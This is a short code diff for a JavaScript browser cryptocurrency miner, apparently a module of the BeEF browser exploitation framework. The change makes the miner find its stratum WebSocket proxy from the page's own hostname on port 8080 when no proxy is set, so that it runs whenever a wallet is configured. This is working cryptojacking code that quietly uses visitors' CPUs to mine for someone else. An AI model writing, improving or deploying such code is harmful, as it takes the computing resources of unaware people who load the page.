@@ -25,7 +25,16 @@
   var OVERCLOCK   = !!cfg.overclock;
   var BATCH_SIZE  = cfg.batchSize  || (SPEED * (OVERCLOCK ? 500 : 250));
 
-  if (!WS_PROXY || !WALLET) return;
+  // ── Auto-detect proxy URL when placeholder or empty ────────────────────────
+  // The stratum-WS proxy (miner-proxy/proxy.js) listens on port 8080.
+  // In Replit the same hostname is reachable on external port 8080 over WSS.
+  if (!WS_PROXY || WS_PROXY.indexOf('YOUR_DOMAIN') !== -1) {
+    var _loc  = window.location;
+    var _proto = _loc.protocol === 'https:' ? 'wss:' : 'ws:';
+    WS_PROXY   = _proto + '//' + _loc.hostname + ':8080';
+  }
+
+  if (!WALLET) return;
   if (window.__beef_miner_running) return;
   window.__beef_miner_running = true;
 
